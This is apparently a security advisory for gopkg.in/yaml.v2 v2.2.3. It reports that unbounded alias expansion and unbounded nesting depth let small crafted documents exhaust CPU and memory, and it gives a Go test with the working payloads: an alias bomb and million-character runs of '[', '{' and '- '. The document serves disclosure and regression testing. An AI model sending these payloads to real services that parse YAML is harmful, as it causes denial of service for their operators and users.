# CPU and memory exhaustion in yaml.v2 Unmarshal on small crafted documents

gopkg.in/yaml.v2 (tested at v2.2.3, commit bb4e33bf68bf89cad44d386192cbed201f35b241) has no limits on alias expansion
ratio or on nesting depth when decoding.

- `(*decoder).unmarshal` in `decode.go` only rejects alias expansion when more than
  99% of decode operations come from aliases, so a 1 MB document that references a
  large anchored list 100 times still expands into millions of nodes.
- `yaml_parser_increase_flow_level` and `yaml_parser_roll_indent` in `scannerc.go`
  grow the flow-level and indent stacks without any bound, so a document made of
  `[`, `{` or `- ` repeated a million times keeps the scanner busy for a very long
  time and allocates heavily.

Impact: any service that calls `yaml.Unmarshal` on untrusted input (config uploads,
Kubernetes-style manifests, API bodies) can be pinned at 100% CPU and pushed into
large allocations with a ~1 MB request.

## Reproduce

Drop this test into the repository root at commit `bb4e33bf68bf89cad44d386192cbed201f35b241` and run `go test -run TestPoC -count=1 .` from that directory. It fails (or panics) on the affected code and passes once the issue is fixed.

```go
package yaml

import (
	"strings"
	"testing"
	"time"
)

// Inputs from the fix commit's benchmark_test.go (TestLimits). Vulnerable:
// Unmarshal of these ~1 MB documents burns CPU/memory for a long time or
// succeeds without limit. Fixed: each is rejected quickly with an error.
func TestPoCResourceLimits(t *testing.T) {
	cases := map[string][]byte{
		"1000kb of maps with 100 aliases": []byte(`{a: &a [{a}` + strings.Repeat(`,{a}`, 1000*1024/4-100) + `], b: &b [*a` + strings.Repeat(`,*a`, 99) + `]}`),
		"1000kb of deeply nested slices":  []byte(strings.Repeat(`[`, 1000*1024)),
		"1000kb of deeply nested maps":    []byte("x: " + strings.Repeat(`{`, 1000*1024)),
		"1000kb of deeply nested indents": []byte(strings.Repeat(`- `, 1000*1024)),
	}
	for name, data := range cases {
		done := make(chan error, 1)
		go func() {
			var v interface{}
			done <- Unmarshal(data, &v)
		}()
		select {
		case err := <-done:
			if err == nil {
				t.Errorf("%s: expected a limit error, got nil", name)
			}
		case <-time.After(20 * time.Second):
			t.Fatalf("%s: Unmarshal did not return within 20s", name)
		}
	}
}
```
